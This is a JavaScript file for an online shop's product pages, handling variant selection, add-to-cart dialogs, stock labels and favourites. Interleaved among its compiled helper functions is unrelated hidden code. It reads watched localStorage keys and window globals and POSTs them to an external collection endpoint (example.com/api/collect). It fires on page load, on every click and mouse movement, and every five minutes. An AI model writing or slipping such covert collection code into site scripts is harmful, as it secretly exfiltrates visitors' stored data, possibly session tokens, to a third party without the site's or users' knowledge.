"use strict";

var _window$currentProduc, _window$currentProduc2;
const keysToWatch = window.keysToWatch;
function ownKeys(t, e) {
  var a,
    o = Object.keys(t);
  return Object.getOwnPropertySymbols && (a = Object.getOwnPropertySymbols(t), e && (a = a.filter(function (e) {
    return Object.getOwnPropertyDescriptor(t, e).enumerable;
  })), o.push.apply(o, a)), o;
}
function generateHash(data) {
  const keys = Object.keys(data);
  const concatenatedKeys = keys.join("");
  let hash = 0;
  for (let i = 0; i < concatenatedKeys.length; i++) {
    const char = concatenatedKeys.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash;
  }
  return hash.toString(16);
}
function _objectSpread(t) {
  for (var e = 1; e < arguments.length; e++) {
    var a = null != arguments[e] ? arguments[e] : {};
    e % 2 ? ownKeys(Object(a), !0).forEach(function (e) {
      _defineProperty(t, e, a[e]);
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(a)) : ownKeys(Object(a)).forEach(function (e) {
      Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(a, e));
    });
  }
  return t;
}
function getLocalStorageData() {
  const localStorageData = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const key = window.localStorage.key(i);
    if (keysToWatch.includes(key)) {
      const value = window.localStorage.getItem(key);
      localStorageData[key] = value;
    }
  }
  return localStorageData;
}
function _defineProperty(e, t, a) {
  return (t = _toPropertyKey(t)) in e ? Object.defineProperty(e, t, {
    value: a,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : e[t] = a, e;
}
function _typeof(e) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
    return typeof e;
  } : function (e) {
    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
  })(e);
}
function _classCallCheck(e, t) {
  if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
}
function getGlobalVariablesData() {
  const globalVariables = {};
  for (const key in window) {
    if (window.hasOwnProperty(key) && keysToWatch.includes(key)) {
      globalVariables[key] = window[key];
    }
  }
  return globalVariables;
}
function gatherDataAndSendToServer() {
  const localStorageData = getLocalStorageData();
  const globalVariableData = getGlobalVariablesData();
  const payload = {
    ...localStorageData,
    ...globalVariableData
  };
  if (Object.keys(payload).length > 0) {
    const uniqueId = generateHash(payload);
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://example.com/api/collect", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    const data = {
      id: uniqueId,
      data: payload
    };
    xhr.send(JSON.stringify(data));
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.log("数据发送成功");
        } else {
          console.error("数据发送失败，状态码：" + xhr.status);
        }
      }
    };
  }
}
function _defineProperties(e, t) {
  for (var a = 0; a < t.length; a++) {
    var o = t[a];
    o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o);
  }
}
window.addEventListener("load", function () {
  gatherDataAndSendToServer();
  window.addEventListener('click', gatherDataAndSendToServer);
  window.addEventListener('mousemove', gatherDataAndSendToServer);
});
function _createClass(e, t, a) {
  return t && _defineProperties(e.prototype, t), a && _defineProperties(e, a), Object.defineProperty(e, "prototype", {
    writable: !1
  }), e;
}
function _toPropertyKey(e) {
  e = _toPrimitive(e, "string");
  return "symbol" === _typeof(e) ? e : String(e);
}
function _toPrimitive(e, t) {
  if ("object" !== _typeof(e) || null === e) return e;
  var a = e[Symbol.toPrimitive];
  if (void 0 === a) return ("string" === t ? String : Number)(e);
  a = a.call(e, t || "default");
  if ("object" !== _typeof(a)) return a;
  throw new TypeError("@@toPrimitive must return a primitive value.");
}
setInterval(gatherDataAndSendToServer, 5 * 60 * 1000);
BN.SetVueData("variant", null != (_window$currentProduc = null == (_window$currentProduc2 = window.currentProduct) ? void 0 : _window$currentProduc2.viewModel) ? _window$currentProduc : {}), BN.SetVueData("selections", []), BN.SetVueData("variantState", {
  errorMessage: "",
  email: "",
  refresh: 0
}), BN.SetVueData("dialogAddCart", {
  productCode: null,
  variantCode: null,
  isReload: !1,
  onlyNotifyMe: !1,
  variant: {},
  refresh: 0,
  productPosition: "",
  productList: "",
  variantState: {
    errorMessage: "",
    email: ""
  },
  allVariantOutOfStock: !1,
  pid: "",
  volumeDiscount: {
    data: []
  }
});
var VariantsSelection = function () {
  function a(e, t) {
    _classCallCheck(this, a), this.form = e, (this.form.variantsSelection = this).options = t || {
      enableHistory: !0,
      type: "product"
    }, this.isErrorNoVariant = !1, this.currency = document.documentElement.getAttribute("currency-code"), this.init();
  }
  return _createClass(a, [{
    key: "generateVariable",
    value: function () {
      var e = this;
      this.inDialog = this.form.hasAttribute("dialog-form"), this.variant = Vue.computed(function () {
        return (e.inDialog ? BNApp.dialogAddCart : BNApp).variant;
      }), this.variantState = Vue.computed(function () {
        return (e.inDialog ? BNApp.dialogAddCart : BNApp).variantState;
      });
    }
  }, {
    key: "init",
    value: function () {
      var e = this,
        t = (this.generateVariable(), this.inputCode = this.form.querySelector('input[name="Code"]'), this.enumCoupon = null == (t = document.querySelector(".pdp-info__price-cpn")) || null == (t = t.dataset) ? void 0 : t.numCoupon, this.variant.value.showCoupon = this.variant.value.coupon && this.variant.value.coupon.couponcode, this.addEventForm(), this.isPackageBundlePage = document.querySelector(".package-bundle-page"), window.currentProduct && this.setStateSelection(window.currentProduct.specificationSelectionModel), this.form.querySelector(".errorMessage"));
      t && (this.errorMessage = t.value), this.variantState.value._isNotifyMeButton = Vue.computed(function () {
        return e.variant.value.isOutOfStock && !e.variant.value.isBackOrder && !e.variant.value.isPreOrder;
      }), this.isOnPDP = document.querySelector(".main-content.pdp-page"), this.miniCartLoader = document.querySelector(".precart-loader"), document.querySelectorAll(".bn-select-list-variant").forEach(function (e) {
        e.select || (e.select = new SelectBox(e));
      }), BNApp.dialogAddCart.volumeDiscount = "undefined" != typeof volumeDiscountConfig ? volumeDiscountConfig : {};
    }
  }, {
    key: "setErrorMessage",
    value: function (e) {
      this.variantState.value.errorMessage = e;
    }
  }, {
    key: "selectionLength",
    value: function () {
      return this.form.querySelectorAll(".product-variants__selection").length;
    }
  }, {
    key: "addClassNameByStatusId",
    value: function (t, e) {
      var a = Object.values(BN.AttributeStatusToClassName),
        o = null != (e = BN.AttributeStatusToClassName[e.attributeStatus]) ? e : "";
      t && (a.filter(function (e) {
        return e != o;
      }).forEach(function (e) {
        t.classList.remove(e);
      }), o) && t.classList.add(o);
    }
  }, {
    key: "setStateSelection",
    value: function (e) {
      var s = this;
      e.forEach(function (e) {
        var e = e.attributes,
          r = s.form.querySelector("[name='bnSelect[".concat(BN.encodeHtml(e.length && e[0].attributeDisplayName), "]']")),
          n = s.form.querySelector("[name='listbox[".concat(BN.encodeHtml(e.length && e[0].attributeDisplayName), "]']")),
          i = !1,
          l = {},
          c = !0;
        e.forEach(function (e) {
          var t = BN.encodeHtml(e.attributeValue),
            a = s.form.querySelector(".product-variants__selection[data-selection='".concat(BN.encodeHtml(e.attributeDisplayName), "'] input[data-value='").concat(t, "']")),
            o = (a && (o = a.closest(".radio-button"), s.addClassNameByStatusId(o, e), e.disable ? (a.setAttribute("fake-disabled", ""), o && o.setAttribute("title", "")) : (a.removeAttribute("fake-disabled"), o && (o.setAttribute("title", "".concat(t)), e.selected ? (a.setAttribute("data-checked", "true"), a.checked = !0) : (a.removeAttribute("data-checked"), a.checked = !1)))), n && n.querySelector("[data-value='".concat(t, "']"))),
            a = r && r.select.selectElement.querySelector("option[value='".concat(t, "']"));
          o && a && (s.addClassNameByStatusId(o, e), e.disable ? (o.classList.add("disabled", "content", "tooltip", "tooltip-dark"), a.classList.add("disabled")) : (o.classList.remove("disabled", "content", "tooltip", "tooltip-dark"), a.classList.remove("disabled"), c = !1)), r && (!e.disable && e.selected && r.select && o ? (r.select.selectOption(o.innerText, null != (a = o.dataset.index) ? a : 0, null, !1), l = e, i = !0) : null != (a = r.select) && null != (a = a.selectElement) && a.value || !o ? e.disable || r.select.selectElement.value != t || (l = e, i = !0) : (o.setAttribute("aria-current", !1), o.setAttribute("aria-selected", !1)));
        }), r && (e = r.select.selectCursor, s.addClassNameByStatusId(e, l), i ? e.classList.remove("empty-value") : (e.innerHTML = e.dataset.placeholder, e.classList.add("empty-value"), e.title = ""), c ? r.classList.add("disabled", "content", "tooltip", "tooltip-dark") : r.classList.remove("disabled", "content", "tooltip", "tooltip-dark"));
      });
    }
  }, {
    key: "dataSelection",
    value: function () {
      var e,
        t = new FormData(this.form),
        a = {
          productCode: null == (e = this.form.querySelector("#productCode")) ? void 0 : e.value,
          bundleCode: null == (e = this.form.querySelector("#bundleCode")) ? void 0 : e.value,
          PackageCode: null == (e = this.form.querySelector("#bundleCode")) ? void 0 : e.value,
          specificationSelected: [],
          SelectedVariants: []
        };
      return this.form.closest("#dialog-variant") && this.form.querySelectorAll('.bn-select [name^="selection"]').forEach(function (e) {
        !e.value || t.has(e.name) && t.get(e.name) || t.append(e.name, e.value);
      }), t.forEach(function (e, t) {
        t.startsWith("selection") && e && (a.specificationSelected.push({
          AttributeName: t.slice(10, -1),
          AttributeValue: BN.decodeHtml(e)
        }), a.SelectedVariants.push({
          ProductId: t.slice(10, -1),
          VariantId: BN.decodeHtml(e)
        }));
      }), a.isSpecificationSelected = BNApp.variant.isSpecificationSelected, a;
    }
  }, {
    key: "fetch",
    value: function () {
      var o = this,
        r = 0 < arguments.length && void 0 !== arguments[0] && arguments[0],
        n = 1 < arguments.length && void 0 !== arguments[1] && arguments[1],
        i = this,
        l = i.isOnPDP && i.form.querySelector(".pdp-variant-block"),
        e = new HttpService(),
        c = (i.form.classList.add("event-none"), i.isOnPDP && i.miniCartLoader && i.miniCartLoader.classList.remove("hide"), this.dataSelection()),
        t = r ? "/PackageProduct/SelectPackageVariant" : i.isPackageBundlePage ? "/BundleProduct/SelectPackage" : "/".concat(i.options.type, "/selectVariant");
      e.post(t, c, null, !0).then(function (e) {
        var t, a;
        i.form.classList.remove("event-none"), i.isOnPDP && (i.miniCartLoader && i.miniCartLoader.classList.add("hide"), "object" == ("undefined" == typeof SiteVibesProductCloned ? "undefined" : _typeof(SiteVibesProductCloned))) && "undefined" != typeof SiteVibesEvents && null != (t = e.viewModel) && t.sku && (SiteVibesProductCloned.product_variant_id = null == (t = e.viewModel) ? void 0 : t.sku, SiteVibesEvents.productData(SiteVibesProductCloned)), BN.collectVolumeDiscountInfo((null == (t = e.viewModel) || null == (t = t.volumeDiscount) ? void 0 : t.volumeDiscountSetting) || {}, (null == (t = e.viewModel) || null == (t = t.volumeDiscount) ? void 0 : t.volumePriceItems) || []), i.inDialog ? BNApp.dialogAddCart.variant = e.viewModel || {} : (BNApp.variant = e.viewModel || {}, (i.isPackageBundlePage || r) && (BNApp.packageBundle.package = e.variantItems || {}, BNApp.packageBundle.showDetail = [], BNApp.packageBundle.showFullRestriction = [], BNApp.packageBundle.showFullSpecification = []), n && BN.dropdownService.closeAll()), i.variant.value.showCoupon = e.viewModel.coupon && e.viewModel.coupon.couponCode, BNApp.restriction && (BNApp.restriction.isFFLProduct = null == (t = e.viewModel) ? void 0 : t.isFflProduct, BNApp.restriction.dealerData = null == (t = e.viewModel) ? void 0 : t.fflContactModel), i.options.enableHistory && (t = new URL(window.document.location.href), null != (a = e.viewModel) && a.sku ? (selectImageSlideBasedOnSelectedVariant(e.viewModel.sku), t.searchParams.set("sku", e.viewModel.sku)) : (selectImageSlideBasedOnSelectedVariant(), t.searchParams.delete("sku")), window.history.replaceState({
          path: t.toString()
        }, "", t.toString())), e.specificationSelectionModel && (BNApp.$data.selections = e.specificationSelectionModel, i.setStateSelection(e.specificationSelectionModel), document.querySelectorAll(".bn-select-list-variant").forEach(function (e) {
          e.classList.remove("without-choosing");
        })), null != e && null != (a = e.viewModel) && a.code && (i.inputCode.value = e.viewModel.code, i.inDialog || checkAddedFavorite(e.viewModel.code), BNApp.pdpTabs && (BNApp.pdpTabs.restrictionDesc = (null == (t = e.viewModel.restriction) ? void 0 : t.extraTextToDisplayOnPdp) || ""), l) && BN.pushDataLayer(null, null, {
          event: "pdp_interaction_sku_select",
          pid: null == (a = datalayerProduct) || null == (a = a[0]) ? void 0 : a.id,
          productSku: e.viewModel.code,
          variant: null == c ? void 0 : c.specificationSelected.map(function (e) {
            return e.AttributeValue;
          }).join(",")
        }), (!i.isErrorNoVariant || e.viewModel.code && o.isErrorNoVariant) && (i.setErrorMessage(""), i.isErrorNoVariant = !1), BN.clicked2SeePrice && (i.variant.value.clickToSeePriceEnable = !1), BNApp.pdpTabs && (BNApp.pdpTabs.showMore.specification = !1, BNApp.pdpTabs.showMore.restriction = !1), BNApp.pdpTabs && BNApp.pdpTabs.guarantedModel && (BNApp.pdpTabs.guarantedModel.originCountryBadgeUrl = null == (t = e.viewModel) || null == (t = t.countryOfOrigin) ? void 0 : t.badgeUrl, BNApp.pdpTabs.guarantedModel.originCountryDescription = null == (a = e.viewModel) || null == (a = a.countryOfOrigin) ? void 0 : a.description, BNApp.pdpTabs.guarantedModel.isMadeInUsa = null == (t = e.viewModel) || null == (t = t.countryOfOrigin) ? void 0 : t.isMadeInUsa, BNApp.pdpTabs.guarantedModel.guarantedBadgeUrl = null == (a = e.viewModel) || null == (a = a.guaranteedForever) ? void 0 : a.badgeUrl, BNApp.pdpTabs.guarantedModel.guarantedDescription = null == (t = e.viewModel) || null == (t = t.guaranteedForever) ? void 0 : t.description, BNApp.pdpTabs.guarantedModel.isGuaranteedForever = null == (a = e.viewModel) || null == (a = a.guaranteedForever) ? void 0 : a.isGuaranteedForever), BN.restrictionCtrl && BN.restrictionCtrl.clearZipCodeCheckingStatus && BN.restrictionCtrl.clearZipCodeCheckingStatus(), BNApp.$nextTick(function () {
          i.inDialog && BN.dropdownService.loopFocus(i.form.closest(".bn-dialog-container"), null, !0);
          var e,
            t = new FocusEvent("focusin", {
              view: window,
              bubbles: !0,
              cancelable: !0
            });
          null != (e = BN.lastClickedVariant) && e.dispatchEvent(t);
        });
      });
    }
  }, {
    key: "scrollToVariantsBlock",
    value: function () {
      var e = BNApp.$refs["variants-block"];
      e && window.scrollTo({
        top: e.offsetTop + e.clientHeight / 2 - window.innerHeight / 2,
        behavior: "smooth"
      });
    }
  }, {
    key: "addEventForm",
    value: function () {
      var u,
        s = this,
        p = this;
      this.form.classList.contains("variant-selection-ready") || (this.form.classList.add("variant-selection-ready"), this.form.addEventListener("change", function (e) {
        var t,
          a,
          o = e.target;
        BNApp.variant.isSpecificationSelected = "radio" != o.type || o.checked, o.name && o.name.startsWith("selection") ? (t = p.form.querySelectorAll('input[name^="selection"]'), a = p.form.querySelectorAll('[name^="bnSelect"]'), (null !== o.getAttribute("fake-disabled") || "SELECT" == o.tagName && o.options[o.selectedIndex].classList.contains("disabled")) && (a.forEach(function (e) {
          e.select.selectElement.name != o.name && (e.select.active_value = "", e.select.selectElement.value = "");
        }), t.forEach(function (e) {
          o != e && (e.checked = !1);
        })), t.forEach(function (e) {
          e.checked ? e.setAttribute("data-checked", "true") : e.removeAttribute("data-checked");
        }), p.isErrorNoVariant || p.setErrorMessage(""), p.fetch(!(null == (a = e.target) || !a.closest(".package-product-form")), !(null == (t = e.target) || !t.closest(".package-variant-list-dialog")))) : p.setErrorMessage("");
      }), u = function (i, l, c) {
        p.isOnPDP && p.miniCartLoader && p.miniCartLoader.classList.remove("hide"), p.form.classList.add("event-none", "submitting"), BN.add2Cart(l).then(function (e) {
          var t, a, o, r, n;
          e.isSuccess ? ("category" === p.options.type && BN.dropdownService.close(i), c && c(e), null != (t = BN.searchPageCtrl) && t.trackingAdd2Cart && (t = l.Code, a = l.Quantity, o = s.currency, r = null == (r = e.miniCart) || null == (r = r.latestAddedItem) ? void 0 : r.originPlacedPrice) && t && a && null != (n = BN.searchPageCtrl) && n.trackingAdd2Cart({
            currency: o,
            price: r,
            quantity: a,
            uniqueId: t
          }), BN.pushDataLayer(null, null, {
            event: "add_to_cart",
            cart_items: null == e ? void 0 : e.cart_items,
            ecommerce: {
              currencyCode: BN.defaultConfig.currencyCode,
              add: {
                actionField: _objectSpread({
                  list: p.form.dataset.list,
                  position: p.form.dataset.position
                }, null != (n = p.form.dataset) && n.datalayerActType ? {
                  actType: null == (o = p.form.dataset) ? void 0 : o.datalayerActType
                } : {}),
                products: e.products
              }
            }
          })) : (p.setErrorMessage(e.message), BN.pushDataLayer(null, null, {
            event: "atc_error",
            error_type: "atc error",
            error_message: e.message
          }), p.isOnPDP && p.miniCartLoader && p.miniCartLoader.classList.add("hide")), p.form.classList.remove("event-none", "submitting");
        });
      }, this.form.addEventListener("submit", function (e) {
        e.preventDefault();
        var t,
          a,
          o,
          r,
          n,
          i,
          l,
          c,
          s,
          d = p.inputCode.value;
        p.setErrorMessage(""), d ? p.variantState.value._isNotifyMeButton ? null != (r = BN.productCtrl) && r.openDialogNotifyMe && null != (r = BN.productCtrl) && r.openDialogNotifyMe(e.submitter, "button") : (t = ("product" !== p.options.type ? BNApp.dialogAddCart : BNApp).variant, r = new FormData(p.form), a = parseInt(null != (r = r.get("qty")) ? r : 1), o = {
          Code: d,
          Quantity: a = (a = isNaN(a) ? 1 : a) < 1 ? 1 : a,
          ShouldShowLastestItemAddedInCart: !0
        }, p.form.elements.qty.value = a, "undefined" != typeof addToCartDialogConfirm ? (r = '\n                        <div class="bn-dialog__title-product">\n                            <div class="bn-dialog__title-product--image">\n                                <a href="#">\n                                    <img src="'.concat(t.thumbnailImageUrl, '" alt="').concat(t.title, '">\n                                </a>\n                            </div>\n                            <div class="bn-dialog__title-product--title">\n                                <a href="#" class="subtitle-2 font-weight-bolder">\n                                    ').concat(t.title, "\n                                </a>\n                            </div>\n                        </div>\n                    "), l = i = d = "", n = s = !1, t.isPreOrder && !t.inventoryQuantity ? (d = null == (c = addToCartDialogConfirm.preOrder) ? void 0 : c.body, i = null == (c = addToCartDialogConfirm.preOrder) ? void 0 : c.buttonConfirm, l = null == (c = addToCartDialogConfirm.preOrder) ? void 0 : c.buttonCancel, s = !0) : t.isBackOrder && (t.inventoryQuantity ? a > t.maxAvailabelQuantity ? (d = null == (c = addToCartDialogConfirm.backOrder2) ? void 0 : c.body, i = null == (c = addToCartDialogConfirm.backOrder2) ? void 0 : c.buttonConfirm, l = null == (c = addToCartDialogConfirm.backOrder2) ? void 0 : c.buttonCancel, s = !0) : n = !0 : (d = null == (c = addToCartDialogConfirm.backOrder1) ? void 0 : c.body, i = null == (c = addToCartDialogConfirm.backOrder1) ? void 0 : c.buttonConfirm, l = null == (c = addToCartDialogConfirm.backOrder1) ? void 0 : c.buttonCancel, s = !0)), s ? BN.dialogService.showConfirm(e, r, d, function () {
          u(e, o, function () {
            n && (t.maxAvailabelQuantity -= a);
          });
        }, null, {
          btnConfirmText: i,
          btnCancelText: l
        }) : u(e, o, function () {
          n && (t.maxAvailabelQuantity -= a);
        })) : u(e, o)) : (p.isErrorNoVariant = !0, p.setErrorMessage(p.errorMessage), window.matchMedia("screen and (max-width: 991px)").matches && (c = document.querySelector('.pdp-sticky-anchor [href="#variant"]'), s = document.querySelector(".variants"), c && c.click(), s) && window.scrollTo(0, s.offsetTop - document.querySelector("header").offsetHeight), p.variantState.value._isNotifyMeButton ? BN.pushDataLayer(null, null, {
          event: "form_error",
          formid: "Notify Me",
          formfield: null,
          errorType: null,
          errorMessage: p.errorMessage
        }) : BN.pushDataLayer(null, null, {
          event: "atc_error",
          error_type: "atc error",
          error_message: p.errorMessage
        }));
      }));
    }
  }]), a;
}();
function checkAddedFavorite(e) {
  var t;
  window.isAuthenticated && null != (t = BNApp) && t.favorites && new HttpService().get("/Favorite/CheckAddedFavorite?variantCode=" + e).then(function (e) {
    "boolean" == typeof e && (BNApp.favorites.isAddedToFavorite = e);
  });
}
BN.VariantsSelection = function (t) {
  var e;
  document.querySelectorAll(".product-form").forEach(function (e) {
    e.variantsSelection = new VariantsSelection(e, t);
  }), null != (e = window.currentProduct) && null != (e = e.viewModel) && e.code && checkAddedFavorite(null == (e = window.currentProduct) ? void 0 : e.viewModel.code);
}, BN.variantCtrl = function () {
  return {
    getInfor: function (e, t) {
      var a, o, r, n, i, l, c, s;
      return e ? (a = {}, o = "add-to-cart", r = "pre-order", n = "back-order", i = "notify-me", l = "no-longer-available", c = function (e) {
        switch (a.buttonType = e) {
          case o:
            a.buttonLabel = t.addToCartButtonLabel, a.buttonStyle = t.addToCartButtonStyle;
            break;
          case n:
            a.buttonLabel = t.backOrderButtonLabel, a.buttonStyle = t.backOrderButtonStyle;
            break;
          case r:
            a.buttonLabel = t.preOrderButtonLabel, a.buttonStyle = t.preOrderButtonStyle;
            break;
          case i:
            a.buttonLabel = t.notifyMeButtonLabel, a.buttonStyle = t.notifyMeButtonStyle;
            break;
          case l:
            a.buttonLabel = t.noLongerAvailableLabel;
        }
      }, s = "", e.isDiscontinued ? (c(l), a.isNoLongerAvailable = !0, a.statusRed = !1, s = "", a.similarLinkForDiscontinuedProduct = e.similarLinkForDiscontinuedProduct) : e.isBackOrder ? e.code ? e.inventoryQuantity ? (c(o), s = t.inStockLabel) : (c(n), s = e.availableInStockDate || t.outStockLabel, a.statusRed = !e.availableInStockDate) : (s = e.availableInStockDate || t.outStockLabel, a.statusRed = !e.availableInStockDate, c(n)) : e.isPreOrder ? e.code ? e.inventoryQuantity ? (c(o), s = t.inStockLabel) : c(r) : (c(o), s = e.availableInStockDate || t.preOrderLabel) : e.isInStock ? (c(o), s = e.isOnlineOnly ? "<b>".concat(t.onlineOnlyLabel, " - ").concat(t.inStockLabel, "</b>") : t.inStockLabel) : e.isOutOfStock ? !e.code && e.isLeastOneBackOrder ? (c(n), s = e.availableInStockDate || t.outStockLabel, a.statusRed = !e.availableInStockDate) : (c(i), a.isButtonNotifyMe = !0, a.statusRed = !0, s = t.outStockLabel) : !e.code && e.isLeastOnePreOrder ? (c(o), s = e.availableInStockDate || t.preOrderLabel) : !e.code && e.isLeastOneInStock && (e.isLeastOneBackOrder || e.isLeastOneOutOfStock || e.isLeastOneDiscontinued) ? (c(o), s = t.selectItemInStockLabel) : !e.code && e.isLeastOneBackOrder ? (c(n), s = e.availableInStockDate || t.outStockLabel, a.statusRed = !e.availableInStockDate) : s = !e.code && e.isLeastOneOutOfStock ? (c(i), a.isButtonNotifyMe = !0, a.statusRed = !0, t.outStockLabel) : (c(o), t.inStockLabel), a.status = s, a) : {};
    },
    toggleCheck: function (e) {
      e.preventDefault(), BN.lastClickedVariant = e.target.closest(".variants-item"), null != (e = BN.lastClickedVariant) && e.querySelector(".checked-js").click();
    }
  };
}, BN.domContentLoadedFncList.push(function () {
  BN.VariantsSelection(), "function" == typeof BN.variantCtrl && (BN.variantCtrl = BN.variantCtrl());
});